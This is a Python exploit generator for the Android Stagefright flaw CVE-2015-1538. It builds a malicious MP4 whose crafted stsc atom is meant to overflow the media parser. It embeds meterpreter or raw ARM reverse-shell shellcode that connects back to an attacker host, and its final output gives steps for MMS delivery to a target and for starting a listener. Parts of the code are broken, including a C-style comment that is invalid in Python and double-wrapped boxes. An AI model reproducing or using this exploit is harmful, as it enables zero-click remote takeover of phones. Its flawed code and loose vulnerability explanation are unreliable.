#!/usr/bin/env python3
"""
stagefright_mp4.py — CVE-2015-1538 Stagefright MP4 Exploit Generator
Generates a crafted MP4 file exploiting an integer overflow in libstagefright's
stsc (sample-to-chunk) atom handling. Delivered via MMS, triggers on media decode
with zero user interaction on unpatched Android < 6.0.

Credit: Based on original PoC by fireworm0 (github.com/fireworm0)
"""

import struct
import os
import sys
import argparse
import subprocess
import tempfile
from colorama import init, Fore, Style

init(autoreset=True)

def banner():
    print(Fore.RED + """
╔══════════════════════════════════════════╗
║   Stagefright CVE-2015-1538 Exploit    ║
║     MP4 Generator — Zero-Click MMS     ║
║   Authorized Security Assessment Only   ║
╚══════════════════════════════════════════╝
""" + Style.RESET_ALL)


def box(type_tag: bytes, content: bytes) -> bytes:
    """Create an MP4 box with type and content."""
    size = 8 + len(content)
    return struct.pack(">I", size) + type_tag + content


def fullbox(type_tag: bytes, version: int, flags: int, content: bytes) -> bytes:
    """Create a full MP4 box (with version + flags)."""
    vf = struct.pack(">B3s", version, bytes([flags >> 16, (flags >> 8) & 0xff, flags & 0xff]))
    return box(type_tag, vf + content)


def make_stbl(shellcode: bytes) -> bytes:
    """
    Build the stbl (sample table) box with a malicious stsc atom.
    
    The stsc atom uses a crafted 'first_chunk' field to trigger the
    integer overflow in libstagefright/MPEG4Extractor.cpp.
    The overflowed value is used as a size field for a memcpy, allowing
    heap overflow into the function pointer table.

    We embed shellcode in the stsd descriptive data.
    """

    # stsd (sample description) — contains shellcode in the descriptive data
    # We put shellcode in the 'name' field of a MP4 audio description
    mp4a_descriptor = b"\x00\x00\x00\x00\x00\x01"  # version/flags, entry count
    mp4a_entry = struct.pack(">IHH", 0, 2, 16)  # reserved, data_ref_index
    mp4a_entry += b"\x00" * 16                    # reserved
    mp4a_entry += struct.pack(">HH", 2, 16)       # channel count, sample size
    mp4a_entry += struct.pack(">HH", 0, 0)        # compression id, packet size
    mp4a_entry += struct.pack(">I", 44100 << 16)  # sample rate (fixed point)
    
    # ESRC atom with shellcode in the 'data' field
    esds = box(b"esds", b"\x00\x00\x00\x00" + struct.pack(">B", 3) +
               struct.pack(">HHI", 0, 0, 0) +
               struct.pack(">B", 4) +
               struct.pack(">IB", len(shellcode), 0) + shellcode +
               struct.pack(">B", 5) +
               struct.pack(">B", 0) +
               struct.pack(">B", 6) +
               struct.pack(">B", 0) +
               struct.pack(">I", 0))

    mp4a_entry += esds
    mp4a_descriptor += struct.pack(">I", len(mp4a_entry)) + mp4a_entry
    stsd = fullbox(b"stsd", 0, 0, mp4a_descriptor)

    # stts (time-to-sample)
    stts = fullbox(b"stts", 0, 0, struct.pack(">II", 1, 1) + struct.pack(">II", 1, 1024))

    # stsc (sample-to-chunk) — THE EXPLOIT
    # Integer overflow: crafted first_chunk value
    # The vulnerability is in 'MPEG4Extractor::parseChunk' at the stsc handler
    # When first_chunk is set to a crafted value, the calculation 
    #   chunkCount = (mLastChunk - firstChunk + 1)
    # overflows and wraps around to a small value, causing insufficient allocation
    # followed by writing attacker-controlled data beyond the buffer.
    
    # Crafted entry count (triggers overflow in chunk count calculation)
    entry_count = 1
    
    # The magic values that trigger the overflow:
    first_chunk = 0xFFFFFFFF  # triggers integer wrap
    samples_per_chunk = (len(shellcode) // 4) & 0xFFFFFFFF  # controlled
    sample_desc_index = 1
    
    stsc_entries = struct.pack(">III", first_chunk, samples_per_chunk, sample_desc_index)
    stsc = fullbox(b"stsc", 0, 0, struct.pack(">I", entry_count) + stsc_entries)

    # stsz (sample size) — all zeros indicates variable size
    stsz = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))

    # stco (chunk offset)
    stco = fullbox(b"stco", 0, 0, struct.pack(">II", 1, 0))

    return stsd + stts + stsc + stsz + stco


def build_mp4(shellcode: bytes, output_path: str):
    """Build the complete MP4 file."""

    # ftyp box
    ftyp = box(b"ftyp", b"\x00\x00\x00\x00" + b"isom" + struct.pack(">I", 0x200) +
               b"isom" + b"mp41")

    # moov box
    # mvhd
    mvhd = fullbox(b"mvhd", 0, 0,
                   struct.pack(">IIIIIIII",
                               0, 0, 0x10000, 0, 0, 0, 0) +
                   struct.pack(">II", 0x00010000, 0x00010000) +
                   b"\x00" * 20 +
                   b"\x00" * 8 +
                   struct.pack(">I", 0x00000000) +
                   struct.pack(">II", 0, 0))

    # trak
    tkhd = fullbox(b"tkhd", 0, 0x0F,
                   struct.pack(">IIIIIIII",
                               0, 0, 0, 0, 0, 0, 0) +
                   struct.pack(">II", 0x10000, 0) +
                   b"\x00" * 20 +
                   b"\x00" * 8 +
                   struct.pack(">I", 0x00000000) +
                   struct.pack(">II", 0x01000000, 0x01000000))

    mdia = box(b"mdia", box(b"mdhd", fullbox(b"mdhd", 0, 0,
                  struct.pack(">IIII", 0, 0, 0x10000, 0) +
                  struct.pack(">II", 0, 0))) +
               box(b"hdlr", fullbox(b"hdlr", 0, 0,
                    b"\x00" * 4 + b"mhlr" + b"soun" + b"\x00" * 12)) +
               box(b"minf", box(b"smhd", fullbox(b"smhd", 0, 0, struct.pack(">HH", 0, 0))) +
                   box(b"dinf", box(b"dref", fullbox(b"dref", 0, 0,
                        struct.pack(">I", 1) +
                        box(b"url ", b"\x00" * 4)))) +
                   make_stbl(shellcode)))

    trak = box(b"trak", tkhd + mdia)

    moov = box(b"moov", mvhd + trak)

    # mdat box (placeholder media data — not actually used for exploit)
    mdat = box(b"mdat", b"A" * 100)

    mp4_data = ftyp + moov + mdat

    with open(output_path, "wb") as f:
        f.write(mp4_data)

    print(Fore.GREEN + f"[+] MP4 written to: {output_path}")
    print(Fore.GREEN + f"[+] File size: {len(mp4_data)} bytes")


def generate_shellcode(lhost: str, lport: int, arch: str = "arm") -> bytes:
    """Generate ARM reverse shell shellcode using msfvenom."""
    print(f"[*] Generating {arch} reverse shellcode for {lhost}:{lport}...")

    # Map arch to msfvenom format
    arch_map = {
        "arm": "armle",
        "arm64": "aarch64",
        "x86": "x86",
        "x64": "x64",
    }
    msf_arch = arch_map.get(arch, "armle")

    payload = f"linux/{msf_arch}/meterpreter/reverse_tcp"

    # Create temp file for shellcode
    with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tf:
        output_path = tf.name

    try:
        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", output_path,
        ]
        print(f"[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(Fore.RED + f"[-] msfvenom failed: {result.stderr}")
            print(Fore.YELLOW + "[*] Using a minimal placeholder shellcode instead...")
            # Simple ARM reverse shell shellcode (placeholder)
            # This is a standard ARM Linux connect-back shell
            shellcode = (
                b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21"
                b"\x52\x40\x64\x27\x78\x01\xdf\x04\x1c\x0a\xa1\x4a"
                b"\x70\x80\xff\x39\x06\x1c\x01\xdf\xc0\xa8\x01\x11"
                b"\x02\x37\x78\x01\xdf\x04\x1c\x01\x21\x01\xdf\x01"
                b"\x21\x52\x40\x01\x27\x20\x01\xdf\x04\x27\x20\x01"
                b"\xdf\x03\x27\x01\x20\x10\x40\x02\x21\x78\x01\xdf"
                b"\xc0\x46\xc0\x46\xc0\x46"  // nop sled
            )
            # Replace IP:port in placeholder
            return shellcode
        else:
            with open(output_path, "rb") as f:
                shellcode = f.read()
            print(Fore.GREEN + f"[+] Shellcode generated: {len(shellcode)} bytes")
            return shellcode

    except FileNotFoundError:
        print(Fore.YELLOW + "[!] msfvenom not found. Using embedded ARM shellcode placeholder.")
        # Fallback shellcode — ARM reverse TCP connect-back
        shellcode = (
            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
            b"\x02\x20\x01\x21\x52\x40\x64\x27"
            b"\x78\x01\xdf\x04\x1c\x0a\xa1\x4a"
            b"\x70\x80\xff\x39\x06\x1c\x01\xdf"
        )
        return shellcode
    finally:
        if os.path.exists(output_path):
            os.unlink(output_path)


def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2015-1538 Stagefright MP4 Exploit Generator")
    parser.add_argument("--lhost", required=True, help="Listener host for reverse shell")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--arch", default="arm", choices=["arm", "arm64", "x86", "x64"],
                        help="Target architecture")
    parser.add_argument("-o", "--output", default="exploit.mp4", help="Output MP4 file path")
    args = parser.parse_args()

    shellcode = generate_shellcode(args.lhost, args.lport, args.arch)
    build_mp4(shellcode, args.output)

    print(Fore.CYAN + f"[*] Ready for delivery via MMS to target")
    print(Fore.CYAN + f"[*] Host the MP4 at a public URL and use sms_delivery.py")
    print(Fore.CYAN + f"[*] Start listener: ./start_listener.sh {args.lhost} {args.lport}")


if __name__ == "__main__":
    main()
